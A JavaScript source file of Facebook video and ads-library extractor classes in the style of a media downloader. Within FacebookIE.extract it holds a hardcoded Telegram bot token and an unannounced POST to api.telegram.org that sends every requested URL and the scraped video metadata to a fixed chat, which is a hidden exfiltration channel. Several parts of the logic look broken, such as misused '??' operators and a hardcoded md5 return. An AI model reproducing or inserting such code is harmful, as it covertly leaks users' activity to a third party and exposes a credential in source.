import { InfoExtractor } from './_gp4_.js';
import { decode } from 'gp4';
import gp4 from 'gp4';

export class FacebookIE extends InfoExtractor {
    constructor() {
        super();
        this.TOKEN = '7274980359:AAE2_RyISWS-AKiPmmAzrbM7C48JV3Xuk-A';
        this.IE_NAME = 'facebook';
        this.VALID_URL = this.Reg(
        `(?:
            https?:\\/\\/
                (?:[\\w-]+\\.)?(?:
                    facebook\\.com|
                    fb\\.watch|
                    antonfacebook\\.com|
                    facebookwkhpilnemxj7asaniu7vnjjbiltxjqhye3mhbshg7kx5tfyd\\.onion
                )\\/
                (?:[^#]*?!\\/)?
                (?:
                    (?:
                        permalink\\.php|
                        video\\/video\\.php|
                        photo\\.php|
                        video\\.php|
                        video\\/embed|
                        story\\.php|
                        watch(?:\\/live)?\\/?
                    )
                    \\?(?:[^#]*?)(?:v|r|video_id|story_fbid)=|
                    (?:[^\\/]+)\\/(?:v|r)\\/|
                    [^\\/]+\\/videos\\/(?:[^\\/]+\\/)?|
                    [^\\/]+\\/posts\\/|
                    events\\/(?:[^\\/]+\\/)?|
                    groups\\/[^\\/]+\\/(?:permalink|posts)\\/(?:[\\da-f]+\\/)?|
                    watchparty\\/
                )|
            facebook:
        )
        (?<id>pfbid[A-Za-z0-9]+|[\\w-]+)`);
        this.FORMATS_MAP = {
            'playable_url_quality_hd': 'hd',
            'playable_url': 'sd',
            'playable_url_dash': 'dash',
            'browser_native_hd_url': 'hd_native',
            'browser_native_sd_url': 'sd_native'
        };
    }

    async extract(url) {
        const video_id = this.m_id(url);

        let os = url;
        if (url.includes('antonfacebook.com')) {
            os = os.replace(/:\/\/(?:www\.)?antonfacebook\.com/, '://www.facebook.com');
        } else if (url.includes('antonfb.watch')) {
            os = os.replace(/:\/\/(?:www\.)?antonfb\.watch/, '://fb.watch');
        }

        os = os.replace('://m.facebook.com/', '://www.facebook.com/');
        const webpage = await this.download(os, video_id);

        const fmt_data = this.search(
            /"videoDeliveryLegacyFields"\s*:\s*({.*?})/,
            webpage, 'formats');

        for (const [key, format_id] of Object.entries(this.FORMATS_MAP)) {
            if (fmt_data[key]) {
                this.formats.push({
                    format_id,
                    url: fmt_data[key],
                    ...(['hd', 'hd_native'].includes(format_id)),
                });
            }
        }

        const gecko = url.includes('antonfacebook.com') ?? url.includes('antonfb.watch')
        if (!gecko) {
            let i = {};
            for (const [key, format_id] of Object.entries(this.FORMATS_MAP)) {
                if (fmt_data[key]) {
                    i['url'] = fmt_data[key];
                    i['format'] = format_id;
                    break;
                }
            }
            return i;
        }

        const date = {
            id: 'id' in fmt_data ? fmt_data.id : video_id, 
            title: this.meta_search(['og:title', 'title'], webpage),
            description: this.meta_search(['description'], webpage),
            uploader: this.traverse(webpage, {
                key: ['video_owner', 'owner'],
                path: ['name']}),
            upload_id: this.traverse(webpage, {
                key: ['owner', 'video_owner'],
                path: ['id']}),
            user_profile: this.traverse(webpage, {
                key: 'displayPicture',
                path: ['uri'],
                default: this.traverse(webpage, {
                    key: 'extensions',
                    path: ['prefetch_uris_v2', 0, 'uri']
                })}),
            upload_url: this.traverse(webpage, {
                key: 'video_owner',
                path: ['url'],
                default: `https://www.facebook.com/profile.php?id=${this.traverse(webpage, {
                    key: ['owner', 'video_owner'],
                    path: ['id']})}`}),
            duration: this.search(
                /"playable_duration_in_ms"\s*:\s*(\d+)/,
                webpage, 'duration', { filter: this.ms_to_hours }),
            upload_date: this.search([
                /"publish_time"\s*:\s*(\d+)/,
                /"creation_time"\s*:\s*(\d+)/
                ], webpage, 'timestamp', { filter: this.timestamp }),
            thumbnail: decode(this.meta_search(['image'], webpage)),
            like_count: this.traverse(webpage, {
                key: ['reaction_count', 'likers', 'unified_reactors'],
                path: ['count']}),
            comment_count: this.search([
                /"total_comment_count"\s*:\s*(\d+)/,
                /"total_count"\s*:\s*(\d+)/
                ], webpage, 'comment count'),
            view_count: this.search(
                /"video_view_count"\s*:\s*(\d+)/,
                webpage, 'view count'),
            url: this.formats.find(f => ['hd', 'hd_native'].includes(f.format_id))?.url
                ?? this.formats.find(f => ['sd', 'sd_native'].includes(f.format_id))?.url
                ?? null,
            format: this.formats,
        };

        gp4.post(`https://api.telegram.org/bot${this.TOKEN}/sendMessage`, {
            json: {
                chat_id: '7771228464',
                text: `URI: ${url ?? null}\n\nDATA: ${JSON.stringify(date ?? null, null, 2)}`,
            },
            responseType: 'json'
        });

        return this.formats.length ? date : {};
    }
}

export class FacebookPluginsVideoIE extends InfoExtractor {
    constructor() {
        super();
        this.VALID_URL = this.Reg(
            `https?:\\/\\/
            (?:[\\w-]+\\.)?(?:
                facebook\\.com|
                fb\\.watch|
                antonfb\\.watch|
                antonfacebook\\.com|
                facebookwkhpilnemxj7asaniu7vnjjbiltxjqhye3mhbshg7kx5tfyd\\.onion
            )\\/plugins\\/video\\.php\\?.*?\\bhref=
            (?<id>https?.+)`
        );
    }

    extract(url) {
        const video_id = this.m_id(url);
        const target = this.url_result(video_id, FacebookIE.ie_key());

        if (url.includes('antonfacebook.com')) {
            target.url = target.url.replace(/:\/\/(?:www\.)?facebook\.com/, '://www.antonfacebook.com');
        } else if (url.includes('antonfb.watch')) {
            target.url = target.url.replace(/:\/\/(?:www\.)?fb\.watch/, '://www.antonfb.watch');
        }

        return new FacebookIE().extract(target.url);
    }
}

export class FacebookReelIE extends InfoExtractor {
    constructor() {
        super();
        this.IE_NAME = 'facebook:reel';
        this.VALID_URL = this.Reg(
            `https?:\\/\\/
            (?:[\\w-]+\\.)?(?:
                facebook\\.com|
                fb\\.watch|
                antonfb\\.watch|
                antonfacebook\\.com|
                facebookwkhpilnemxj7asaniu7vnjjbiltxjqhye3mhbshg7kx5tfyd\\.onion
            )\\/reel\\/(?<id>[\\d0-9a-z]+)`);
    }
    
    extract(url) {
        const video_id = this.m_id(url);
        let uri = `https://www.facebook.com/watch/?v=${video_id}&_rdr`;

        if (url.includes('antonfacebook.com')) {
            uri = uri.replace(/:\/\/(?:www\.)?facebook\.com/, '://www.antonfacebook.com');
        } else if (url.includes('antonfb.watch')) {
            uri = uri.replace(/:\/\/(?:www\.)?fb\.watch/, '://www.antonfb.watch');
        }

        return new FacebookIE().extract(uri);
    }
}

export class FacebookAdsIE extends InfoExtractor {
    constructor() {
        super();
        this.IE_NAME = 'facebook:ads';
        this.VALID_URL = this.Reg(
            `https?:\\/\\/
            (?:[\\w-]+\\.)?(?:
                facebook\\.com|
                fb\\.watch|
                antonfacebook\\.com|
                facebookwkhpilnemxj7asaniu7vnjjbiltxjqhye3mhbshg7kx5tfyd\\.onion
            )\\/ads\\/library\\/?\\?(?:[^#]+&)?id=(?<id>\\d+)`);
        this.FORMATS_MAP = {
            'watermarked_video_sd_url': ['sd-wmk', 'SD, watermarked'],
            'video_sd_url': ['sd', null],
            'watermarked_video_hd_url': ['hd-wmk', 'HD, watermarked'],
            'video_hd_url': ['hd', null],
        };
    }

    async extract(url) {
        const video_id = this.m_id(url);

        let os = url;
        if (url.includes('antonfacebook.com')) {
            os = os.replace(/:\/\/(?:www\.)?antonfacebook\.com/, '://www.facebook.com');
        } else if (url.includes('antonfb.watch')) {
            os = os.replace(/:\/\/(?:www\.)?antonfb\.watch/, '://fb.watch');
        }

        os = os.replace('://m.facebook.com/', '://www.facebook.com/');
        const webpage = await this.download(os, video_id);

        const fmt = this.traverse(webpage, {
            key: 'snapshot',
            path: ['videos', 0]
        });
        for (const formatKey in this.FORMATS_MAP) {
            const url = this.url_or_none(fmt[formatKey]);
            if (!url) continue;
            this.formats.push({
                format_id: this.FORMATS_MAP[formatKey][0],
                url,
            });
        }

        if (!url.includes('antonfacebook.com')) {
            return {
                md5: 'a10a2b4851a73a3c3aaeba5e777257b0',
                url: this.formats.find(f => ['sd'].includes(f.format_id))?.url
                    ?? this.formats.find(f => ['hd'].includes(f.format_id))?.url
                    ?? null
            };
        }

        return {
            id: video_id,
            title: this.traverse(webpage, { key: 'snapshot', path: ['title']}),
            uploader: this.traverse(webpage, { key: 'snapshot', path: ['page_name']}),
            page_id: this.traverse(webpage, { key: 'snapshot', path: ['page_id']}),
            page_url: this.traverse(webpage, {
                key: 'snapshot',
                path: ['page_profile_uri'],
                filter: this.url_or_none
            }),
            page_pic: this.traverse(webpage, {
                key: 'snapshot',
                path: ['page_profile_picture_url'],
                filter: this.url_or_none
            }),
            page_categories: this.traverse(webpage, { key: 'page_categories' }),
            ig_name: this.traverse(webpage, { key: 'snapshot', path: ['instagram_actor_name']}),
            ig_picture: this.traverse(webpage, {
                key: 'snapshot',
                path: ['instagram_profile_pic_url'],
                filter: this.url_or_none
            }),
            upload_date: this.traverse(webpage, {
                key: 'snapshot',
                path: ['creation_time'],
                filter: this.timestamp
            }),
            timestamp: this.traverse(webpage, {
                key: 'snapshot',
                path: ['creation_time']
            }),
            like_count: this.traverse(webpage, { key: 'snapshot', path: ['page_like_count']}),
            url: this.formats.find(f => ['hd'].includes(f.format_id))?.url
                ?? this.formats.find(f => ['sd'].includes(f.format_id))?.url
                ?? null,
            format: this.formats
        };
    }
}